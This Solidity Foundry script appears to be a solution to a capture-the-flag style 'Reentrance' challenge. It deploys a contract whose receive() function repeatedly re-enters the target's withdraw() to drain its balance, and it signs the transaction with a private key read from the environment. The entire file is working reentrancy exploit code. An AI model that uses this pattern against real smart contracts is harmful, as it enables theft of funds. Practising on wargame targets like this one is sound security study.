// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract ReentraceSolution {

    uint256 amount;
    // uint256 amount = 0.001 ether;
    Reentrance reentrance = Reentrance(payable(0xc47878C031c5E61B0520f5bcF18D9bEa40B30322));

    constructor() public payable {
        amount = address(reentrance).balance;
        reentrance.donate{value:amount}(address(this));
    }

    function withdraw() public payable {
        reentrance.withdraw(amount);
        (bool result,) = msg.sender.call{value:amount*2}("");
    }

    receive() external payable {
        reentrance.withdraw(amount);
    }
}

contract ReentrancySolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ReentraceSolution reentranceSolution = new ReentraceSolution{value:0.001 ether}();
        reentranceSolution.withdraw();
        vm.stopBroadcast();
    }
}